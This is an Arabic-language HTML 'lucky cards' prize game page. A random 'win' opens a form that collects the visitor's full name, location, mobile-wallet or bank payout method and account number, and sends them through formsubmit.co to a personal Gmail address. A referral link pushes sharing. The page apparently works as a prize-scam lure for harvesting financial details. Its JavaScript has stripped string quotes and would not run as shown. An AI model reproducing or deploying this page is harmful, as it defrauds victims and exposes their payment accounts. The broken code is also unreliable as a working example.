<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لعبة الحظ والجوائز - تكنو اب</title>
    <style>
        body {
            font-family:  Cairo , sans-serif;
            background-color: #f4f7f6;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: #fff;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
        }
        .card-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin: 20px 0;
        }
        .card {
            background: #007bff;
            color: white;
            padding: 30px 10px;
            font-size: 18px;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.3s;
        }
        .card:hover {
            background: #0056b3;
        }
        .result-box {
            margin-top: 20px;
            font-size: 20px;
            font-weight: bold;
            color: #28a745;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.5);
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            background: white;
            padding: 20px;
            border-radius: 8px;
            width: 90%;
            max-width: 400px;
            text-align: right;
        }
        input, select {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button.submit-btn {
            background: #28a745;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .stats {
            margin-top: 15px;
            font-size: 14px;
            color: #666;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>بطاقات الحظ السعيدة</h1>
    <p>اختر بطاقة واكتشف جائزتك الفورية!</p>
    
    <div class="stats">
        <p>نقاطك: <span id="points">0</span> | لفات مجانية: <span id="freeSpins">0</span></p>
        <p>رابط الإحالة الخاص بك: <br><input type="text" id="refLink" readonly style="font-size:12px; text-align:center;"></p>
    </div>

    <div class="card-grid" id="cardGrid">
        <div class="card" onclick="playGame()">بطاقة 1</div>
        <div class="card" onclick="playGame()">بطاقة 2</div>
        <div class="card" onclick="playGame()">بطاقة 3</div>
        <div class="card" onclick="playGame()">بطاقة 4</div>
    </div>

    <div class="result-box" id="resultText"></div>
</div>

<!-- Modal Form -->
<div class="modal" id="winModal">
    <div class="modal-content">
        <h3>مبروك لقد فزت بـ <span id="prizeName"></span>!</h3>
        <p>الرجاء ادخال بيانات الاستلام الخاصة بك:</p>
        <form id="claimForm" action="https://formsubmit.co/abdulshafiosama82@gmail.com" method="POST">
            <input type="hidden" name="Prize" id="inputPrize">
            <input type="text" name="Name" placeholder="اسمك الكامل" required>
            <input type="text" name="Location" placeholder="أنت منين؟ (المدينة / المنطقة)" required>
            <select name="Payment_Method" required>
                <option value="">اختر طريقة الاستلام</option>
                <option value="فودافون كاش">فودافون كاش</option>
                <option value="حساب بنكي">حساب بنكي</option>
                <option value="إنستا باي">إنستا باي</option>
            </select>
            <input type="text" name="Account_Number" placeholder="رقم الهاتف أو الحساب المستلم عليه" required>
            <button type="submit" class="submit-btn">إرسال البيانات</button>
        </form>
    </div>
</div>

<script>
    // إعداد نظام الإحالة والنقاط
    let points = localStorage.getItem( user_points ) ? parseInt(localStorage.getItem( user_points )) : 0;
    let freeSpins = localStorage.getItem( free_spins ) ? parseInt(localStorage.getItem( free_spins )) : 0;
    
    document.getElementById( points ).innerText = points;
    document.getElementById( freeSpins ).innerText = freeSpins;

    let userId = localStorage.getItem( user_id );
    if(!userId) {
        userId =  user_  + Math.random().toString(36).substring(2, 9);
        localStorage.setItem( user_id , userId);
    }
    document.getElementById( refLink ).value = window.location.origin + window.location.pathname +  ?ref=  + userId;

    // التحقق من الإحالة عبر الرابط
    const urlParams = new URLSearchParams(window.location.search);
    const refBy = urlParams.get( ref );
    if(refBy && refBy !== userId && !localStorage.getItem( referred_before )) {
        // افتراضياً لتجربة الإحالة
        localStorage.setItem( referred_before ,  true );
        alert( تم تسجيل الدخول عبر رابط إحالة صديق! );
    }

    function playGame() {
        // نسب الفوز المطلوبة
        // 80% حظ أوفر, 10% لفة أخرى, 1% سامسونج, 1% 450 كاش, 1% 250 كاش, 1% 450 أخرى, 1% ساعة, 1% سماعة (المجموع 96% + 4% للجوائز النادرة)
        const rand = Math.random() * 100;
        let prize = "";

        if (rand < 80) {
            prize = "حظ أوفر جرب مرة أخرى";
            document.getElementById( resultText ).innerText = "عذراً، " + prize;
        } else if (rand < 90) {
            prize = "لفة أخرى مجانية";
            freeSpins++;
            localStorage.setItem( free_spins , freeSpins);
            document.getElementById( freeSpins ).innerText = freeSpins;
            document.getElementById( resultText ).innerText = "مبروك! حصلت على " + prize;
        } else if (rand < 91) {
            prize = "هاتف سامسونج جلاكسي A17";
            showWinModal(prize);
        } else if (rand < 92) {
            prize = "450 جنيه كاش";
            showWinModal(prize);
        } else if (rand < 93) {
            prize = "250 جنيه كاش";
            showWinModal(prize);
        } else if (rand < 94) {
            prize = "ساعة سمارت";
            showWinModal(prize);
        } else if (rand < 95) {
            prize = "سماعة إيربودز";
            showWinModal(prize);
        } else {
            prize = "حظ أوفر جرب مرة أخرى";
            document.getElementById( resultText ).innerText = "عذراً، " + prize;
        }
    }

    function showWinModal(prize) {
        document.getElementById( resultText ).innerText = "مبروك فزت بـ: " + prize;
        document.getElementById( prizeName ).innerText = prize;
        document.getElementById( inputPrize ).value = prize;
        document.getElementById( winModal ).style.display =  flex ;
    }
</script>

</body>
</html>
